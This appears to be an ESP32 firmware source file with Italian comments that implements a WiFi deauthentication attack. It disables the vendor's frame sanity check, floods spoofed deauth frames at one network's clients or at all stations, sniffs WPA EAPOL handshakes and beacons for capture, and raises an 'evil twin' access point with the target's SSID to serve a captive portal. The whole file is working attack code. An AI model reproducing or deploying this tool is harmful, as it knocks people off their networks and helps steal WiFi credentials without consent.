#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

bool beacon_captured = false;

// --- INIZIO AGGIUNTA BUFFER ---
PacketBuffer packet_buffer[MAX_BUFFER_SIZE];
volatile int buffer_head = 0;
volatile int buffer_tail = 0;

//deauth_frame è il pacchetto proiettile, verrà riempito con i dati del target (MAC address) e spedito
deauth_frame_t deauth_frame;
//deauth_type specifica la tipologia di attacco: singolo dispositivo o tutti quelli rilevati
int deauth_type = DEAUTH_TYPE_SINGLE;
//eliminated_stations è un contatore per tenere traccia di quante deautenticazioni sono state inviate con successo
int eliminated_stations;

/*
Di norma il compilatore cerca ieee80211_raw_frame_sanity_check() e la trova nella libraria closed-source di Espressif (libnet80211.a),
tuttavia questa funzione serve ad impedire l'invio di pacchetti "illegali" o malformati. La community tuttavia ha analizzato le 
librerie e, attraverso tool di reverse engineering (Ghidra), ha scoperto l'esistenza di questa funzione.
E' stata quindi creata una funzione con lo stesso identico nome dell'originale ed è stato forzato il Linker a dare priorità al nostro
codice piuttosto che alle librerie esterne (in platformio.ini i build-flag -Wl,-z,muldefs servono proprio a questo scopo).
Il risultato è che il sistema ignora completamente la funzione originale che compie i controlli e usa la nostra funzione "dummy" che
si limita a ritornare sempre 0 segnalando così che il pacchetto non sia "illegale" o malformato.
*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

/*
Vedi: https://github.com/Jeija/esp32-80211-tx
esp_wifi_80211_tx() è una API creata da Espressif. Tale funzione serve per inviare frame IEEE 802.11 arbitrari, si tratta
dunque di un'API estremamente potente dato che di fatto permette il jamming delle reti WiFi o, come nel nostro caso, l'invio di frame
di deautenticazione. Più nello specifico consente di inviare un pacchetto "raw" byte per byte, essenziale per il nostro scopo.
*/
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

/*
La funzione sniffer() viene chiamata ogni volta che l'antenna dell'ESP32 riceve un pacchetto mentre è in modalità promiscua. 
La direttiva IRAM_ATTR (vedi la sua definizione in esp_attr.h) dice al compilatore di salvare questa funzione nella RAM e non nella 
Flash memory. Tale scelta è motivata dal fatto che si tratta di una funzione chiamata centinaia di volte al secondo (è praticamente 
un'interrupt), deve dunque essere velocissima.
*/
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  //wifi_promiscuous_pkt_t è una struct definita in esp_wifi_types.h, al suo interno c'è il payload del pacchetto
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  //wifi_packet_t è una struct definita in types.h, anche al suo interno c'è il payload del pacchetto ed infatti viene estratto
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  //mac_hdr_t è una struct definita in types.h, rappresenta un header MAC Wi-Fi (IEEE 802.11), viene quindi estratto dal pacchetto
  const mac_hdr_t *mac_header = &packet->hdr;
  //Calcola la lunghezza del pacchetto e fa un controllo di sicurezza. Se il pacchetto è corrotto o vuoto, esce subito.
  //rx_ctrl.sig_len restituisce la lunghezza del pacchetto includendo anche il Frame Check Sequence(FCS).
  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len;
  if (packet_length < 0 || packet_length > MAX_PACKET_LEN) return; 
  
  // Controlliamo se è un pacchetto DATA (WPA handshake viaggia su pacchetti DATA)
  // Verifichiamo se il pacchetto coinvolge il nostro AP target (come mittente o come destinatario)
  bool involves_target_ap = (memcmp(mac_header->src, deauth_frame.sender, 6) == 0) || 
                          (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0);

  // --- LOGICA CATTURA BEACON (ESSID) ---
  // Se non abbiamo ancora salvato il beacon E il pacchetto è di tipo MANAGEMENT
  if (!beacon_captured && type == WIFI_PKT_MGMT) {
    
    // Verifica se viene dal nostro AP Target (Source Address == Target BSSID)
    if (memcmp(mac_header->src, deauth_frame.sender, 6) == 0) {
        
        uint8_t *data = (uint8_t *)packet;
        // Il Frame Control (primi 2 byte) per un Beacon è solitamente 0x80 0x00
        // data[0] è il Frame Control Low byte.
        // Subtype 8 (Beacon) = 1000 (binario) -> 0x80 nel byte frame control
        if (data[0] == 0x80) {
            
            // Trovato il Beacon del target! Salviamolo nel buffer.
            int next_head = (buffer_head + 1) % MAX_BUFFER_SIZE;
            if (next_head != buffer_tail) {
                // Copia nel buffer (usa packet_length calcolato all'inizio)
                memcpy(packet_buffer[buffer_head].data, data, packet_length);
                packet_buffer[buffer_head].len = packet_length;
                
                buffer_head = next_head;
                
                beacon_captured = true; // Importante: Ne basta uno solo!
                #ifdef SERIAL_DEBUG
                Serial.println(">>> BEACON (SSID) CATTURATO E MESSO IN CODA!");
                #endif
            }
        }
    }
  }
  // --- FINE LOGICA BEACON ---

  // --- INIZIO CODICE SNIFFER EAPOL ---
  // Se siamo in modalità target singolo e il pacchetto è di tipo DATA e coinvolge il nostro AP
  if ((deauth_type == DEAUTH_TYPE_SINGLE) && (type == WIFI_PKT_DATA) && involves_target_ap) {
    uint8_t *data = (uint8_t *)packet; // Puntatore all'inizio del pacchetto WiFi

    // Cerchiamo l'header LLC/SNAP standard per EAPOL.
    // La sequenza è: AA AA 03 00 00 00 88 8E
    // Scansioniamo il pacchetto partendo dall'offset 24 (lunghezza minima header MAC)
    for (int i = 24; i < packet_length - 8; i++) {
      // Controllo firma EtherType 0x888E (EAPOL)
      if (data[i] == 0x88 && data[i+1] == 0x8E) {
        // Controllo aggiuntivo per sicurezza (i byte precedenti devono essere AA AA)
        if (data[i-6] == 0xAA && data[i-5] == 0xAA) {
            
            // Trovato un pacchetto EAPOL!           
            /// CALCOLO INDICE SUCCESSIVO
            int next_head = (buffer_head + 1) % MAX_BUFFER_SIZE;
            
            // Se il buffer non è pieno (head non raggiunge tail)
            if (next_head != buffer_tail) {
                // COPIA VELOCE IN RAM 
                memcpy(packet_buffer[buffer_head].data, data, packet_length);
                packet_buffer[buffer_head].len = packet_length;
                
                // Avanza l'indice di scrittura
                buffer_head = next_head;
            }
            break; 
        }
      }
    }
  }
  // --- FINE CODICE SNIFFER EAPOL ---

  /*
  ATTACCO-CASO A: Target singolo
  1)L'if controlla se il destinatario del pacchetto intercettato è l'AP target (memorizzato in deauth_frame.sender).
  2)Se sì allora un client sta parlando con quell'AP. Si procede dunque con la copia del MAC del client (mac_header->src) dentro il 
  nostro pacchetto di deautenticazione (deauth_frame.station)
  3)Si procede ad inviare una raffica di pacchetti di deautenticazione fingendo di essere l'AP.
  4)Incrementa il contatore delle vittime
  */
  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } 
  
  /*
  ATTACCO-CASO B: Tutti sono possibili target
  1)L'if qui cerca traffico generico verso un AP che però non sia un pacchetto broadcast. Inviare un pacchetto di deauth fingendosi broadcast non ha senso
  2)Se sì allora si procede con la copia sia del MAC del client che quello dell'AP coinvolto nel pacchetto intercettato
  3)Si procede ad inviare la deautenticazione a quella specifica coppia Client-AP
  */
  else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason, String spoof_ssid) {
  beacon_captured = false;
  /*
  Azzeriamo il contatore delle vittime, impostiamo il tipo di attacco e il "motivo" della disconnessione (un codice standard WiFi, ad esempio inattività, 
  AP sovraccarico, ecc).
  */
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  /*
  CASO A: Target singolo
  Passando Wifi.channel(wifi_number) come parametro in WiFi.softAP forziamo l'ESP32 a sintonizzarsi e rimanere fisso sul canale del target.
  Questo è cruciale: per iniettare pacchetti efficaci, l'ESP32 deve trovarsi sullo stesso canale radio del bersaglio. Copia anche il BSSID 
  del target nella struttura del pacchetto falso.
  */
  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));

    // --- LOGICA EVIL TWIN DINAMICA ---
    
    // 1. Disconnettiamo il SoftAP attuale (Napoli_Free_WiFi)
    WiFi.softAPdisconnect(true);
    delay(100);

    // 2. Configuriamo il nuovo SoftAP con il nome del Target
    // Questo permette alla vittima di entrare e vedere il Captive Portal.
    WiFi.softAP(spoof_ssid.c_str(), AP_PASS, WiFi.channel(wifi_number));
    
    DEBUG_PRINT("Evil Twin Started: ");
    DEBUG_PRINTLN(spoof_ssid);

    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } 
  
  /*
  CASO B: Tutti sono possibili target
  L'ESP32 si mette in modalità Station (Client) per poter ascoltare liberamente senza essere vincolato a un canale specifico di un AP.
  */
  else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  /*
  1)Si attiva la modalità promiscua
  2)Applichiamo il filtro filt costante per ascoltare solo i pacchetti di Gestione e Dati (si ignorano ad esempio i pacchetti di Controllo).
  3)Ogni pacchetto ricevuto verrà passato alla funzione sniffer
  */
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  //Si disattiva la modalità promiscua interrompendo così l'intercettazione e l'invio dei pacchetti.
  esp_wifi_set_promiscuous(false);
}